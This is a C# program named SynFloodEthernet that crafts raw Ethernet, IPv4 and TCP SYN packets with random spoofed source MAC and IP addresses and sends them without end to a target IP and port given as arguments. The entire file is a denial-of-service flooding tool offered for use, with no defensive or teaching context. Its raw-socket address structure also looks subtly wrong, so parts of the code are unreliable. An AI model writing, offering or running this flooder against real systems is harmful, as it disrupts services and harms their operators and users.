using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

class SynFloodEthernet
{
    static Random rnd = new Random();

    static byte[] RandomMac()
    {
        var mac = new byte[6];
        rnd.NextBytes(mac);
        // Set the locally administered bit and unicast
        mac[0] = (byte)((mac[0] & 0xFE) | 0x02);
        return mac;
    }

    static byte[] RandomIP()
    {
        var ip = new byte[4];
        rnd.NextBytes(ip);
        // Avoid 0.x.x.x and 127.x.x.x and multicast
        if (ip[0] == 0 || ip[0] == 127 || ip[0] >= 224)
            ip[0] = 1;
        return ip;
    }

    static ushort Checksum(byte[] buffer, int offset, int length)
    {
        uint sum = 0;
        for (int i = offset; i < offset + length - 1; i += 2)
            sum += (uint)(buffer[i] << 8 | buffer[i + 1]);
        if (length % 2 == 1)
            sum += (uint)(buffer[offset + length - 1] << 8);
        while ((sum >> 16) != 0)
            sum = (sum & 0xFFFF) + (sum >> 16);
        return (ushort)~sum;
    }

    public static void Main(string[] args)
    {
        if (args.Length < 3)
        {
            Console.WriteLine("Usage: SynFloodEthernet <interface> <TargetIP> <TargetPort>");
            return;
        }

        string iface = args[0];
        string dstIPstr = args[1];
        int dstPort = int.Parse(args[2]);

        // Get interface index (Linux only, requires root)
        int ifIndex = GetInterfaceIndex(iface);
        if (ifIndex == -1)
        {
            Console.WriteLine("Invalid interface.");
            return;
        }

        // Destination MAC: broadcast (as example)
        byte[] dstMAC = new byte[] { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

        byte[] dstIP = IPAddress.Parse(dstIPstr).GetAddressBytes();

        // Create raw socket
        Socket s = new Socket(AddressFamily.Packet, SocketType.Raw, (ProtocolType)0x0003);

        while (true)
        {
            byte[] srcMAC = RandomMac();
            byte[] srcIP = RandomIP();

            // Ethernet header
            byte[] eth = new byte[14];
            Buffer.BlockCopy(dstMAC, 0, eth, 0, 6);
            Buffer.BlockCopy(srcMAC, 0, eth, 6, 6);
            eth[12] = 0x08; eth[13] = 0x00; // EtherType = IPv4

            // IP header (20 bytes)
            byte[] ip = new byte[20];
            ip[0] = 0x45;
            ip[1] = 0;
            ip[2] = 0; ip[3] = 40;
            ip[4] = (byte)rnd.Next(0, 255); ip[5] = (byte)rnd.Next(0, 255);
            ip[6] = 0x40; ip[7] = 0;
            ip[8] = 64;
            ip[9] = 6; // TCP
            ip[10] = 0; ip[11] = 0;
            Buffer.BlockCopy(srcIP, 0, ip, 12, 4);
            Buffer.BlockCopy(dstIP, 0, ip, 16, 4);
            ushort ipCksum = Checksum(ip, 0, 20);
            ip[10] = (byte)(ipCksum >> 8); ip[11] = (byte)ipCksum;

            // TCP header (20 bytes)
            byte[] tcp = new byte[20];
            ushort srcPort = (ushort)rnd.Next(1024, 65535);
            tcp[0] = (byte)(srcPort >> 8); tcp[1] = (byte)srcPort;
            tcp[2] = (byte)(dstPort >> 8); tcp[3] = (byte)dstPort;
            tcp[4] = tcp[5] = tcp[6] = tcp[7] = 0;
            tcp[8] = tcp[9] = tcp[10] = tcp[11] = 0;
            tcp[12] = 0x50;
            tcp[13] = 0x02; // SYN
            tcp[14] = 0x72; tcp[15] = 0x10;
            tcp[16] = tcp[17] = 0;
            tcp[18] = tcp[19] = 0;

            // Compose pseudo-header for TCP checksum
            byte[] pseudo = new byte[12 + 20];
            Buffer.BlockCopy(srcIP, 0, pseudo, 0, 4);
            Buffer.BlockCopy(dstIP, 0, pseudo, 4, 4);
            pseudo[8] = 0;
            pseudo[9] = 6; // TCP
            pseudo[10] = 0; pseudo[11] = 20;
            Buffer.BlockCopy(tcp, 0, pseudo, 12, 20);
            ushort tcpCksum = Checksum(pseudo, 0, pseudo.Length);
            tcp[16] = (byte)(tcpCksum >> 8); tcp[17] = (byte)tcpCksum;

            // Compose full packet
            byte[] pkt = new byte[eth.Length + ip.Length + tcp.Length];
            Buffer.BlockCopy(eth, 0, pkt, 0, eth.Length);
            Buffer.BlockCopy(ip, 0, pkt, eth.Length, ip.Length);
            Buffer.BlockCopy(tcp, 0, pkt, eth.Length + ip.Length, tcp.Length);

            // Send
            SendPacket(s, pkt, ifIndex);
        }
    }

    static int GetInterfaceIndex(string iface)
    {
        // Linux only: get ifindex from /sys/class/net/{iface}/ifindex
        try
        {
            string path = $"/sys/class/net/{iface}/ifindex";
            return int.Parse(System.IO.File.ReadAllText(path).Trim());
        }
        catch { return -1; }
    }

    static void SendPacket(Socket s, byte[] pkt, int ifIndex)
    {
        // sockaddr_ll structure
        byte[] addr = new byte[20];
        addr[0] = 0x11; // AF_PACKET
        addr[1] = 0;
        addr[2] = (byte)(ifIndex & 0xFF); addr[3] = (byte)((ifIndex >> 8) & 0xFF);
        // The rest can be left zero

        s.SendTo(pkt, 0, pkt.Length, SocketFlags.None, new SockAddr(addr));
    }

    class SockAddr : EndPoint
    {
        byte[] addr;
        public SockAddr(byte[] a) { addr = a; }
        public override SocketAddress Serialize()
        {
            SocketAddress sa = new SocketAddress(AddressFamily.Packet, 20);
            for (int i = 0; i < 20; i++) sa[i] = addr[i];
            return sa;
        }
        public override EndPoint Create(SocketAddress socketAddress) => this;
    }
}